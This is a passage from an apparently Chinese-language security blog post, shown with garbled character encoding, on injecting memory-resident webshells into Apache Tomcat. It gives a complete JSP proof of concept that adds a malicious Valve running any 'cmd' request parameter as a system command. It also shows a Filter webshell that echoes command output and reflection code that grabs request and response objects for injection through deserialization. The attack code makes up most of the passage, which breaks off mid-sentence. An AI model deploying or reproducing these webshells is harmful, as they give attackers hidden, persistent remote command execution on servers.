class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Pipeline</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Contained</span> &#123;<br>    <span class="hljs-keyword">public</span> Valve <span class="hljs-title function_">getBasic</span><span class="hljs-params">()</span>;<span class="hljs-comment">//è·å–åŸºç¡€é˜€é—¨</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBasic</span><span class="hljs-params">(Valve valve)</span>;<span class="hljs-comment">//è®¾ç½®åŸºç¡€é˜€é—¨</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addValve</span><span class="hljs-params">(Valve valve)</span>;<span class="hljs-comment">//å¢åŠ é˜€é—¨*</span><br>    <span class="hljs-keyword">public</span> Valve[] getValves();<span class="hljs-comment">//è·å–</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeValve</span><span class="hljs-params">(Valve valve)</span>;<span class="hljs-comment">//ç§»é™¤</span><br>    <span class="hljs-keyword">public</span> Valve <span class="hljs-title function_">getFirst</span><span class="hljs-params">()</span>;<span class="hljs-comment">//è·å–é¦–ä¸ª</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAsyncSupported</span><span class="hljs-params">()</span>;<span class="hljs-comment">//æ˜¯å¦æ”¯æŒå¼‚æ­¥*</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">findNonAsyncValves</span><span class="hljs-params">(Set&lt;String&gt; result)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>org.apache.catalina.Valve</code> çš„å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Valve</span> &#123;<br>    <span class="hljs-keyword">public</span> Valve <span class="hljs-title function_">getNext</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNext</span><span class="hljs-params">(Valve valve)</span>;<span class="hljs-comment">//è®¾ç½®ä¸‹ä¸€ä¸ªé˜€é—¨</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">backgroundProcess</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span><span class="hljs-keyword">throws</span> IOException, ServletException;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAsyncSupported</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Tomcat ä¸­ Pipeline ä»…æœ‰ä¸€ä¸ªå®ç° StandardPipelineï¼Œå­˜æ”¾åœ¨ ContainerBase çš„ pipeline å±æ€§ä¸­ï¼Œå¹¶ä¸” ContainerBase æä¾› <code>addValve</code> æ–¹æ³•è°ƒç”¨ StandardPipeline çš„ addValve æ–¹æ³•æ·»åŠ ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addValve</span><span class="hljs-params">(Valve valve)</span> &#123;<br>    <span class="hljs-keyword">if</span> (valve <span class="hljs-keyword">instanceof</span> Contained) &#123;<br>        ((Contained) valve).setContainer(<span class="hljs-built_in">this</span>.container);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (getState().isAvailable()) &#123;<br>        <span class="hljs-keyword">if</span> (valve <span class="hljs-keyword">instanceof</span> Lifecycle) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                ((Lifecycle) valve).start();<br>            &#125; <span class="hljs-keyword">catch</span> (LifecycleException e) &#123;<br>                log.error(sm.getString(<span class="hljs-string">&quot;standardPipeline.valve.start&quot;</span>), e);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (first == <span class="hljs-literal">null</span>) &#123;<br>        first = valve;<br>        valve.setNext(basic);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">Valve</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> first;<br>        <span class="hljs-keyword">while</span> (current != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">if</span> (current.getNext() == basic) &#123;<br>                current.setNext(valve);<br>                valve.setNext(basic);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            current = current.getNext();<br>        &#125;<br>    &#125;<br><br>    container.fireContainerEvent(Container.ADD_VALVE_EVENT, valve);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>Tomcat ä¸­å››ä¸ªå±‚çº§çš„å®¹å™¨éƒ½ç»§æ‰¿äº† ContainerBase ï¼Œæ‰€ä»¥åœ¨å“ªä¸ªå±‚çº§çš„å®¹å™¨çš„æ ‡å‡†å®ç°ä¸Šæ·»åŠ è‡ªå®šä¹‰çš„ Valve å‡å¯ã€‚</p></blockquote><p>æ·»åŠ åï¼Œå°†ä¼šåœ¨ <code>org.apache.catalina.connector.CoyoteAdapter</code> çš„ <code>service</code> æ–¹æ³•ä¸­è°ƒç”¨ Valve çš„ <code>invoke</code> æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(org.apache.coyote.Request req, org.apache.coyote.Response res)</span><br>        <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">//...</span><br>        postParseSuccess = postParseRequest(req, request, res, response);<br>        <span class="hljs-keyword">if</span> (postParseSuccess) &#123;<br>            request.setAsyncSupported(<br>                    connector.getService().getContainer().getPipeline().isAsyncSupported());<br>            connector.getService().getContainer().getPipeline().getFirst().invoke(<br>                    request, response);<span class="hljs-comment">//è°ƒç”¨invoke</span><br></code></pre></td></tr></table></figure><p>è¿™æ ·æ€è·¯å°±å¾ˆæ¸…æ™°äº†ï¼Œæˆ‘ä»¬åªè¦å†™ä¸€ä¸ªæ¶æ„Valveä¸ºäº†æ–¹ä¾¿å¯ä»¥ç»§æ‰¿<code>ValveBase</code>ï¼Œç„¶åå°†æ¶æ„ä»£ç å†™åœ¨invokeæ–¹æ³•ä¸­,ä¹‹ååªè¦å…ˆé€šè¿‡<code>StandardContext</code>å¯¹è±¡è·å–<code>StandardPipeline</code>ï¼Œè¿™æ ·å°±å¯ä»¥åˆ©ç”¨<code>StandardPipeline.addValve()</code>åŠ¨æ€æ·»åŠ Valve</p><h4 id="å®Œæ•´POC-2"><a href="#å®Œæ•´POC-2" class="headerlink" title="å®Œæ•´POC"></a>å®Œæ•´POC</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Pipeline&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br> <br>&lt;%<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br> <br>    <span class="hljs-type">Pipeline</span> <span class="hljs-variable">pipeline</span> <span class="hljs-operator">=</span> standardContext.getPipeline();<br>%&gt;<br> <br>&lt;%!<br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Valve</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ValveBase</span> &#123;<br> <br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd !=<span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-keyword">try</span>&#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                    e.printStackTrace();<br>                &#125;<span class="hljs-keyword">catch</span> (NullPointerException n)&#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>%&gt;<br> <br>&lt;%<br>    <span class="hljs-type">Shell_Valve</span> <span class="hljs-variable">shell_valve</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Valve</span>();<br>    pipeline.addValve(shell_valve);<br>%&gt;<br></code></pre></td></tr></table></figure><p>åŠ è½½Valve</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost:8080/Java_Shell_war_exploded/Valve.jsp<br></code></pre></td></tr></table></figure><p>ä¹‹åå¯ä»¥ä»»æ„è·¯å¾„å‘½ä»¤æ‰§è¡Œ</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010705853.png" alt="image-20230201070553758"></p><h2 id="0x02-å†…å­˜é©¬å›æ˜¾æŠ€æœ¯"><a href="#0x02-å†…å­˜é©¬å›æ˜¾æŠ€æœ¯" class="headerlink" title="0x02 å†…å­˜é©¬å›æ˜¾æŠ€æœ¯"></a>0x02 å†…å­˜é©¬å›æ˜¾æŠ€æœ¯</h2><h3 id="å›æ˜¾ç¤ºä¾‹"><a href="#å›æ˜¾ç¤ºä¾‹" class="headerlink" title="å›æ˜¾ç¤ºä¾‹"></a>å›æ˜¾ç¤ºä¾‹</h3><p>å¯ä»¥åˆ©ç”¨ä¹‹å‰çš„Tomcat Filterå‹å†…å­˜é©¬è·å–å›æ˜¾,ä¿®æ”¹ä¸€ä¸‹æ¶æ„Filter</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%! <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Filter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        response.setContentType(<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>);<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>        <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();<br> <br>                <span class="hljs-comment">//å°†å‘½ä»¤æ‰§è¡Œç»“æœå†™å…¥æ‰«æå™¨å¹¶è¯»å–æ‰€æœ‰è¾“å…¥</span><br>                <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> scanner.hasNext()?scanner.next():<span class="hljs-string">&quot;&quot;</span>;<br>                scanner.close();<br>                writer.write(result);<br>                writer.flush();<br>                writer.close();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                n.printStackTrace();<br>            &#125;<br>        &#125;<br>        chain.doFilter(request, response);<br>    &#125;<br>&#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010710660.png" alt="image-20230201071005531"></p><h3 id="ThreadLocal-Responseå›æ˜¾"><a href="#ThreadLocal-Responseå›æ˜¾" class="headerlink" title="ThreadLocal Responseå›æ˜¾"></a>ThreadLocal Responseå›æ˜¾</h3><p>å®éªŒç¯å¢ƒ:Tomcat 9.0.77 (Tomcat10åéƒ¨åˆ†æºç é€»è¾‘ä¿®æ”¹,ä»¥åŠä¸€äº›åå°„ä½¿ç”¨ä¼šæŠ¥NullPointerException)</p><p>å¦‚æœç”¨Tomcatçš„å†…å­˜é©¬ï¼Œéœ€è¦JSPæ–‡ä»¶ï¼Œå½“æˆ‘ä»¬éœ€è¦ååºåˆ—åŒ–æ¼æ´æ¥æ³¨å…¥å†…å­˜é©¬æ˜¯ï¼Œéœ€è¦å…¶ä»–çš„æ–¹æ³•è·å–requestå’Œresponseå¯¹è±¡ã€‚</p><p>é¦–å…ˆè¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬å¯»æ‰¾çš„requestå¯¹è±¡åº”è¯¥æ˜¯ä¸€ä¸ªå’Œå½“å‰çº¿ç¨‹ThreadLocalæœ‰å…³çš„å¯¹è±¡ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ã€‚è¿™æ ·æ‰èƒ½è·å–åˆ°å½“å‰çº¿ç¨‹çš„ç›¸å…³ä¿¡æ¯ã€‚æœ€ç»ˆæˆ‘ä»¬èƒ½å¤Ÿåœ¨<code>org.apache.catalina.core.ApplicationFilterChain</code>ç±»ä¸­æ‰¾åˆ°è¿™æ ·ä¸¤ä¸ªå˜é‡*<code>lastServicedRequest</code><em>å’Œ</em><code>lastServicedResponse</code>*ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ApplicationFilterChain</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">FilterChain</span> &#123;<br><br>    <span class="hljs-comment">// Used to enforce requirements of SRV.8.2 / SRV.14.2.5.1</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>&lt;&gt;();<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>&lt;&gt;();<br></code></pre></td></tr></table></figure><blockquote><p>å¹¶ä¸”è¿™ä¸¤ä¸ªå±æ€§è¿˜æ˜¯é™æ€çš„,é»˜è®¤èµ‹å€¼</p></blockquote><p>åœ¨<code>ApplicationFilterChain#internalDoFilter</code>ä¸­ï¼ŒTomcatä¼šå°†requestå¯¹è±¡å’Œresponseå¯¹è±¡å­˜å‚¨åˆ°è¿™ä¸¤ä¸ªå˜é‡ä¸­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">internalDoFilter</span><span class="hljs-params">(ServletRequest request,ServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;<br>    lastServicedRequest.set(request);<br>    lastServicedResponse.set(response);<br>&#125;<br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œæœ‰ä¸€ä¸ªæ¡ä»¶<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>,é»˜è®¤å€¼ä¸ºfalseï¼Œä½†å¯ä»¥åå°„ä¿®æ”¹</p></blockquote><p>æ€»ç»“ä¸€ä¸‹æ€è·¯</p><ol><li>åå°„ä¿®æ”¹<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>çš„å€¼ï¼Œé€šè¿‡<code>ThreadLocal#set</code>æ–¹æ³•å°†requestå’Œresponseå¯¹è±¡å­˜å‚¨åˆ°å˜é‡ä¸­</li><li>åˆå§‹åŒ–<code>lastServicedRequest</code>å’Œ<code>lastServicedResponse</code>ä¸¤ä¸ªå˜é‡ï¼Œé»˜è®¤ä¸ºnull</li><li>é€šè¿‡<code>ThreadLocal#get</code>æ–¹æ³•å°†requestå’Œresponseå¯¹è±¡ä»*<code>lastServicedRequest</code><em>å’Œ</em><code>lastServicedResponse</code>*ä¸­å–å‡º</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;<br> <br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.ServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Modifier;<br> <br><span class="hljs-meta">@WebServlet(&quot;/echo&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Tomcat_Echo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br> <br>        <span class="hljs-keyword">try</span> &#123;<br> <br>            <span class="hljs-comment">//åå°„è·å–æ‰€éœ€å±æ€§</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">WRAP_SAME_OBJECT_FIELD</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;WRAP_SAME_OBJECT&quot;</span>);<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">lastServicedRequestField</span> <span class="hljs-operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="hljs-string">&quot;lastServicedRequest&quot;</span>);<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">lastServicedResponseField</span> <span class="hljs-operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="hljs-string">&quot;lastServicedResponse&quot;</span>);<br> <br>            <span class="hljs-comment">//ä½¿ç”¨modifiersFieldåå°„ä¿®æ”¹finalå‹å˜é‡</span><br>            java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">modifiersField</span> <span class="hljs-operator">=</span> Field.class.getDeclaredField(<span class="hljs-string">&quot;modifiers&quot;</span>);<br>            modifiersField.setAccessible(<span class="hljs-literal">true</span>);<br>            modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.FINAL);<br>            modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; ~Modifier.FINAL);<br>            modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; ~Modifier.FINAL);<br>            WRAP_SAME_OBJECT_FIELD.setAccessible(<span class="hljs-literal">true</span>);<br>            lastServicedRequestField.setAccessible(<span class="hljs-literal">true</span>);<br>            lastServicedResponseField.setAccessible(<span class="hljs-literal">true</span>);<br> <br>            <span class="hljs-comment">//å°†å˜é‡WRAP_SAME_OBJECT_FIELDè®¾ç½®ä¸ºtrueï¼Œå¹¶åˆå§‹åŒ–lastServicedRequestå’ŒlastServicedResponseå˜é‡</span><br>            <span class="hljs-keyword">if</span> (!WRAP_SAME_OBJECT_FIELD.getBoolean(<span class="hljs-literal">null</span>))&#123;<br>                WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="hljs-literal">null</span>,<span class="hljs-literal">true</span>);<br>            &#125;<br> <br>            <span class="hljs-keyword">if</span> (lastServicedRequestField.get(<span class="hljs-literal">null</span>)==<span class="hljs-literal">null</span>)&#123;<br>                lastServicedRequestField.set(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>&lt;&gt;());<br>            &#125;<br> <br>            <span class="hljs-keyword">if</span> (lastServicedResponseField.get(<span class="hljs-literal">null</span>)==<span class="hljs-literal">null</span>)&#123;<br>                lastServicedResponseField.set(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>&lt;&gt;());<br>            &#125;<br> <br>            <span class="hljs-comment">//è·å–requestå˜é‡</span><br>            <span class="hljs-keyword">if</span>(lastServicedRequestField.get(<span class="hljs-literal">null</span>)!=<span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-type">ThreadLocal</span> <span class="hljs-variable">threadLocal</span> <span class="hljs-operator">=</span> (ThreadLocal) lastServicedRequestField.get(<span class="hljs-literal">null</span>);<br>                <span class="hljs-type">ServletRequest</span> <span class="hljs-variable">servletRequest</span> <span class="hljs-operator">=</span> (ServletRequest) threadLocal.get();<br>                System.out.println(servletRequest);<br>                System.out.println((HttpServletRequest) servletRequest == req);<br>            &#125;<br> <br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¬¡è¯·æ±‚å°†requestå’Œresponseå¯¹è±¡å­˜å‚¨è¿›å˜é‡ä¸­ï¼Œç¬¬äºŒæ¬¡è¯·æ±‚æ‰è·å–åˆ°request</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(servletRequest);<br>System.out.println((HttpServletRequest) servletRequest == req);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010824372.png" alt="image-20230201082439227"></p><h3 id="é€šè¿‡å…¨å±€å­˜å‚¨Responseå›æ˜¾"><a href="#é€šè¿‡å…¨å±€å­˜å‚¨Responseå›æ˜¾" class="headerlink" title="é€šè¿‡å…¨å±€å­˜å‚¨Responseå›æ˜¾"></a>é€šè¿‡å…¨å±€å­˜å‚¨Responseå›æ˜¾</h3><h4 id="Tomcat-9-0-55-Tomcat9-0-71åºŸé™¤äº†org-apache-catalina-loader-WebappClassLoaderBas-getResources"><a href="#Tomcat-9-0-55-Tomcat9-0-71åºŸé™¤äº†org-apache-catalina-loader-WebappClassLoaderBas-getResources" class="headerlink" title="Tomcat:9.0.55 (Tomcat9.0.71åºŸé™¤äº†org.apache.catalina.loader.WebappClassLoaderBas.getResources)"></a>Tomcat:9.0.55 (Tomcat9.0.71åºŸé™¤äº†org.apache.catalina.loader.WebappClassLoaderBas.getResources)</h4><p>åœ¨<code>AbstractProcessor</code>ç±»ä¸­ï¼Œæˆ‘ä»¬èƒ½å¤Ÿæ‰¾åˆ°å…¨å±€response,åœ¨Tomcatè°ƒç”¨æ 